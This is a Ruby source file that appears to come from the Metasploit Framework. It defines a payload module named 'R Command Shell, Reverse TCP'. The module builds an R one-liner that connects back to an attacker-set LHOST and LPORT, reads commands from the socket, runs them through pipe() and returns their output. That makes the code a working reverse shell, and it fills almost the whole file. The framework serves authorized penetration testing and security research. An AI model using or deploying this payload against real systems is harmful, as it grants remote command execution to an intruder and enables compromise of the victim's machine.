##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 150

  include Msf::Payload::Single
  include Msf::Payload::R
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'R Command Shell, Reverse TCP',
        'Description' => 'Connect back and create a command shell via R',
        'Author' => [ 'RageLtMan <rageltman[at]sempervictus>' ],
        'License' => MSF_LICENSE,
        'Platform' => 'r',
        'Arch' => ARCH_R,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'r',
        'Payload' => { 'Offsets' => {}, 'Payload' => '' }
      )
    )
  end

  def generate(_opts = {})
    return prepends(r_string)
  end

  def r_string
    lhost = Rex::Socket.is_ipv6?(datastore['LHOST']) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
    return "s<-socketConnection(host='#{lhost}',port=#{datastore['LPORT']}," \
           "blocking=TRUE,server=FALSE,open='r+');while(TRUE){writeLines(readLines" \
           '(pipe(readLines(s, 1))),s)}'
  end
end
